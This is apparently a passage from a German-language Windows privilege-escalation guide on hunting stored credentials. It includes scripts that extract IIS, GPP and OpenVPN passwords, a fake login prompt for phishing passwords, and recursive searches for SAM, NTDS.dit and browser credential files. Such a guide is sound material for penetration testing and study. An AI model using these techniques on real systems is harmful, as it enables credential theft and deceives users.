            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installer werden mit **SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Informationen von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Zugangsdaten)

### Registry-Artefakte für Zugangsdaten von Support-Tools

Einige ältere Remote-Support-Installationen behalten wertbezogene Namen mit Passwortbezug unter festen Anwendungs-Registry-Schlüsseln. Beispielsweise kennzeichnete `SecurityPasswordAES` von TeamViewer laut der [Erklärung des Anbieters zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Wertnamensmarker ist lediglich ein Hinweis zur Überprüfung: Verifizieren Sie die installierte Version, lesbaren Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie diese Zugangsdaten bewerten. Der Wechsel von einem Remote-Support-Passwort zu einem höher privilegierten Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und Sie zur Nutzung dieses Kontos berechtigt sind. Nehmen Sie verschlüsselte und wiederhergestellte Passwörter nicht in routinemäßige Aufzählungsausgaben auf.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn der Verdacht besteht, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie **Dateiverschlüsselung** vom Schutz des Arbeitsblatts oder ausgeblendeten Spalten. [Microsoft erklärt](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung steuert und keine Sicherheitsfunktion ist; er belegt für sich genommen nicht, dass der Inhalt der Arbeitsmappe verschlüsselt ist. Überprüfen Sie nur autorisierte, relevante Dateien und vermeiden Sie es, mögliche Geheimnisse bei einer umfassenden Aufzählung auszugeben. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Zugangsdaten vorhanden sind, noch, dass ein Konto höhere Privilegien hat; überprüfen Sie die tatsächlichen Daten und aktuellen Kontoberechtigungen gesondert.

### Vom CI-Server aufbewahrte Änderungspatches

Ein CI-Server kann übermittelte Quellcodeänderungen nach Abschluss des Builds in seinem Datenverzeichnis aufbewahren. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Remote-Run-Änderungen; das Datenverzeichnis kann konfiguriert werden und muss sich nicht unter `ProgramData` befinden. Ein lesbarer Patch kann entfernte oder hinzugefügte Verweise auf eine Zugangsdaten-Datei, einen Verschlüsselungsschlüssel oder ein Skript enthalten, das beides verwendet. Beispielsweise benötigt ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` sowohl den AES-Schlüssel als auch die verschlüsselte Zeichenfolge; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat angegeben wird. Überprüfen Sie zunächst nur zugängliche Patchnamen und untersuchen Sie anschließend relevante Inhalte mit entsprechender Autorisierung, ohne Geheimnisse in routinemäßigen Aufzählungsausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Zugangsdaten noch Zugriff mit höheren Privilegien. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen einzuchecken.

### Benutzerdefinierte Rotation lokaler Administratorkennwörter

Ein selbst entwickeltes Kennwortrotationsprogramm kann ein verschlüsseltes lokales Administratorkennwort in einem lokalen Dienst speichern, während die Anmeldedaten für dessen Datenspeicher in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei liegen. Überprüfen Sie gemeinsam die geplante Aufgabe des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen des Datenspeichers. Ein nur an Loopback gebundener Datenspeicher ist für lokale Benutzer dennoch erreichbar, wenn sie gültige Zugangsdaten besitzen; die Authentifizierung allein beweist jedoch nicht, dass sie die relevanten Datensätze lesen dürfen. Wenn das Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, überprüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mit Go's [`math/rand`](https://pkg.go.dev/math/rand) ableitet, eignet sich nicht zum Schutz dieses Kennworts; Go weist darauf hin, dass dieses Paket für sicherheitskritische Zufallswerte ungeeignet ist. Vergewissern Sie sich, dass jedes wiederhergestellte Kennwort aktuell ist und zu einem Konto der lokalen Administratorengruppe gehört, bevor Sie es als möglichen Privilegieneskalationspfad betrachten. Eine geplante Aufgabe, ein `.env`-Pfad oder ein verschlüsselter Blob allein belegt keine dieser Bedingungen. Nehmen Sie Kennwörter und Schlüsselmaterial nicht in routinemäßige Aufzählungsausgaben auf.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete lokale Administratorkennwörter. Dessen Verzeichnis- oder Entra-basierter Speicher und die zugehörigen Zugriffskontrollen unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; auch [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) bestimmen, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen kann.

### Java-Server-Plugin-Archive und Wiederverwendung von Zugangsdaten

Einige Java-Server-Plugins werden als JAR-Archive im Verzeichnis `plugins` eines Servers bereitgestellt. Ein lesbares benutzerdefiniertes Plugin kann eine eingebettete Dienstzugangsinformation in der Konfiguration oder im Bytecode enthalten. Untersuchen Sie das Archiv nur mit entsprechender Autorisierung und nehmen Sie wiederhergestellte Geheimnisse nicht in routinemäßige Aufzählungsausgaben auf. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist, und ein wiederhergestelltes Dienstkennwort führt nur dann zu höheren Privilegien, wenn es auch für ein höher privilegiertes Konto gültig ist. Überprüfen Sie die relevanten Datei-ACLs und ersetzen Sie wiederverwendete Zugangsdaten durch separate Geheimnisse. Informationen zum Verzeichnislayout finden Sie im [Installationshandbuch für PaperMC-Plugins](https://docs.papermc.io/paper/adding-plugins/); Informationen zu Archivinhalten finden Sie in der [JAR-Dokumentation von Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Zugangsdaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation, die die eingebettete Datenbank verwendet, kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, überprüfen Sie gemeinsam die `OFUSER`-Datensätze und die Eigenschaft `passwordKey`. Laut der [Dokumentation zum Openfire-Benutzeranbieter](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Passwörter im Klartext oder mit einem in dieser Eigenschaft gespeicherten Schlüssel verschlüsselt abgelegt sein. Ein wiederhergestelltes Passwort ist für eine Privilegieneskalation nur relevant, wenn es noch für eine höher privilegierte Identität gültig ist; der Dateiname allein belegt weder Lesezugriff noch die Wiederverwendung von Zugangsdaten. Der Pfad ist ein Hinweis für die Inventarisierung. Geben Sie Datenbankinhalte und Zugangsdaten daher nicht in routinemäßigen Aufzählungsausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Administrationskonsole offenlegen, selbst wenn eine externe Datenbank verwendet wird. Openfire bindet seine Administrationskonsole üblicherweise an Loopback; ein lokales Konto kann die Adresse dennoch erreichen, wenn der Listener läuft. Überprüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Administratorrolle, die Plugin-Upload-Richtlinie und die Openfire-Dienstidentität. Ein Administrator, der ein Plugin installieren kann, kann möglicherweise dafür sorgen, dass der Plugin-Code im Kontext des Dienstes ausgeführt wird. Das kann hoch privilegiert sein, wenn der Dienst als LocalSystem ausgeführt wird. Ein übereinstimmendes Kontokennwort oder ein lesbarer Konfigurationspfad allein beweist weder Zugriff auf die Administrationskonsole noch Codeausführung. Siehe den [Installations- und Plugin-Verwaltungsleitfaden des Anbieters](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration des forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen, üblicherweise mit dem Namen `server.config.yaml`, können `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit niedrigeren Privilegien diesen Schlüssel lesen kann, kann er möglicherweise ein API-Clientzertifikat ausstellen. Ob dies zu höheren Privilegien führt, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält andere Daten; ihr Fund belegt keinen Zugriff auf die Server-CA. Manche Installationen bewahren den privaten CA-Schlüssel offline auf, sodass eine lesbare Serverkonfiguration den Signaturschlüssel möglicherweise nicht enthält.

Überprüfen Sie auf einem Windows-Server die ACL der **Server**konfiguration im Installationsverzeichnis sowie etwaiger geschützter Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; verwenden Sie den für den Dienst konfigurierten Pfad, falls er abweicht. Bestätigen Sie, dass die aktuelle Identität die Datei lesen kann und `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Aufzählungsausgaben aus. Der Workflow `config api_client` des Anbieters verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; erforderlich ist jedoch auch eine wirksame serverseitige Rolle. Eine solche Rolle anzulegen oder zu ändern, kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine bereits vorhandene privilegierte Serveridentität kann einen Zugriffspfad bieten, selbst wenn diese Schreibvorgänge nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im relevanten Server- oder Agentenkontext, der hoch privilegiert sein kann.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signaturschlüssel möglichst offline auf und beschränken Sie API-Rollen sowie den Zugriff auf Listener. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein natives verschlüsseltes Speichersystem befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während ein exportiertes Sitzungs-Backup `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. [SolarWinds’ Exportanleitung](https://thwack.solarwinds.com/discussion/comment/115591) erklärt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können; das [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) nennt den nativen Speicherort. Prüfe zuerst Dateiberechtigungen und Pfade. Das Auffinden einer dieser Dateien verrät weder das Passwort noch beweist es, dass gespeicherte Anmeldedaten noch gültig sind oder höhere Berechtigungen haben.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registrierung

SSH-Privatschlüssel können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht ausgeführt wird und du möchtest, dass er beim Start automatisch gestartet wird, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH bei einem Computer anzumelden. Die Registry HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und Procmon hat während der Authentifizierung mit asymmetrischen Schlüsseln keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Sie können auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM-Sicherungen

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können auch offline `SAM`-, `SECURITY`- und `SYSTEM`-Hives enthalten. Priorisieren Sie lokal zugängliche Backup- oder Image-Verzeichnisse und prüfen Sie die **Mitgliedsnamen** eines Images, bevor Sie etwas extrahieren; ein `.wim`-Dateiname allein beweist nicht, dass Hives offengelegt werden, und reguläre `install.wim`-, `boot.wim`- und Recovery-Images sind häufige falsche Fährten. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn diese Freigabe zum Scope gehört. Siehe Microsofts [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Anmeldedaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Rechnern bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitslücken auf. Erstens konnten alle Domänenbenutzer auf die als XML-Dateien in SYSVOL gespeicherten Group Policy Objects (GPOs) zugreifen. Zweitens konnten alle authentifizierten Benutzer die in diesen GPPs enthaltenen Passwörter entschlüsseln, da sie mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselt waren. Dies stellte ein erhebliches Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien mit einem nicht leeren Feld „cpassword“ sucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und unterstützt so bei der Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Mit crackmapexec Passwörter auslesen:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS-Webkonfiguration

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für web.config mit Anmeldedaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem ausgelieferten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du es als Offenlegung einstufst. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Speicherort. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Der Name eines Archivs beweist weder, dass es ein Geheimnis enthält, noch, dass wiederhergestellte Zugangsdaten höhere Berechtigungen gewähren.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Sie können den Benutzer jederzeit bitten, seine Zugangsdaten oder sogar die eines anderen Benutzers einzugeben, wenn Sie glauben, dass er sie kennt (beachten Sie, dass es wirklich riskant ist, den Client direkt nach den Zugangsdaten zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die früher **Passwörter** im **Klartext** oder als **Base64** enthielten

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Variante der Dateinamensliste ohne die Password-Safe-Erweiterung

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3-Datenbanken verwenden häufig die Dateiendung `.psafe3`. Behandle einen passenden Dateinamen als möglichen Hinweis auf einen verschlüsselten Tresor. Sein Vorhandensein belegt nicht, dass du ihn lesen oder entsperren oder gespeicherte Zugangsdaten verwenden kannst. Prüfe bei der Untersuchung, wo solche Dateien gespeichert sind, zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls nur ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren benötigst du das tatsächliche Master-Passwort sowie alle konfigurierten Schlüsseldaten oder Kontofaktoren. Wenn eine autorisierte Überprüfung in einem Eintrag ein LM:NT-Hash-Paar findet, überprüfe das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag gewährt für sich allein keine Administrator- oder SYSTEM-Rechte; der Zugriff auf Remote-Dienste, Kontoberechtigungen und jeder separate Schritt zur Dienstausführung müssen ebenfalls gegeben sein. Die Inventarisierung sollte den Tresorpfad und dessen Lesbarkeit erfassen, nicht die Datenbank oder gespeicherte Zugangsdaten ausgeben.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Variante des Suchbefehls ohne die Password Safe-Erweiterung

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Anmeldedaten im Papierkorb

Sie sollten auch den Papierkorb auf darin gespeicherte Anmeldedaten überprüfen.

Prüfen Sie zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Anmeldedaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Datensatz und die gelöschte Datei im zugehörigen `$R`-Eintrag. Prüfen Sie die Metadaten und die Leseberechtigung der aktuellen Identität, bevor Sie ein Archiv öffnen. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup vorhanden ist. Betrachten Sie einen Archivnamen als Anlass zur Prüfung, nicht als Beweis dafür, dass das Archiv ein gültiges Geheimnis enthält.

